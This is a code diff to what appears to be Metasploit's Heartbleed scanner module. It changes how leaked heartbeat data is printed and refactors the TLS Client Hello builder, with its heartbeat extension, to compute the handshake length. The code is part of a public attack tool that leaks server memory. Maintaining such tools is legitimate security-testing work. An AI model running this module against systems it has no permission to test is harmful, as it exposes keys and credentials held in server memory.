@@ -224,7 +224,7 @@ class Metasploit3 < Msf::Auxiliary
         :refs => self.references,
         :info => "Module #{self.fullname} successfully leaked info"
       })
-      print_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+      vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
     else
       print_error("#{peer} - Looks like there isn't leaked information...")
     end
@@ -238,27 +238,29 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def client_hello
-    data = "\x01"                   # Handshake Type: Client Hello (1)
-    data << "\x00\x00\xd8"           # Length: 216
-    data << "\x03\x02"               # Version TLS 1.1
-    data << Rex::Text.rand_text(32)  # Random
-    data << "\x00"                   # Session ID length
-    data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
-    data << CIPHER_SUITES.pack("n*") # Cipher Suites
-    data << "\x01"                   # Compression methods length (1)
-    data << "\x00"                   # Compression methods: null
-    data << "\x00\x49"               # Extensions length (73)
-    data << "\x00\x0b"               # Extension type (ec_point_formats)
-    data << "\x00\x04"               # Extension length
-    data << "\x03\x00\x01\x02"       # Extension data
-    data << "\x00\x0a"               # Extension type (elliptic curves)
-    data << "\x00\x34"               # Extension length
-    data << "\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11" # Extension data
-    data << "\x00\x23"               # Extension type (Sessionticket TLS)
-    data << "\x00\x00"               # Extension length
-    data << "\x00\x0f"               # Extension type (Heartbeat)
-    data << "\x00\x01"               # Extension length
-    data << "\x01"                   # Extension data
+    hello_data = "\x03\x02"                # Version TLS 1.1
+    hello_data << Rex::Text.rand_text(32)  # Random
+    hello_data << "\x00"                   # Session ID length
+    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
+    hello_data << CIPHER_SUITES.pack("n*") # Cipher Suites
+    hello_data << "\x01"                   # Compression methods length (1)
+    hello_data << "\x00"                   # Compression methods: null
+    hello_data << "\x00\x49"               # Extensions length (73)
+    hello_data << "\x00\x0b"               # Extension type (ec_point_formats)
+    hello_data << "\x00\x04"               # Extension length
+    hello_data << "\x03\x00\x01\x02"       # Extension data
+    hello_data << "\x00\x0a"               # Extension type (elliptic curves)
+    hello_data << "\x00\x34"               # Extension length
+    hello_data << "\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11" # Extension data
+    hello_data << "\x00\x23"               # Extension type (Sessionticket TLS)
+    hello_data << "\x00\x00"               # Extension length
+    hello_data << "\x00\x0f"               # Extension type (Heartbeat)
+    hello_data << "\x00\x01"               # Extension length
+    hello_data << "\x01"                   # Extension data
+
+    data = "\x01\x00"                      # Handshake Type: Client Hello (1)
+    data << [hello_data.length].pack("n")         # Length: 216
+    data << hello_data
 
     ssl_record(HANDSHAKE_RECORD_TYPE, data)
   end
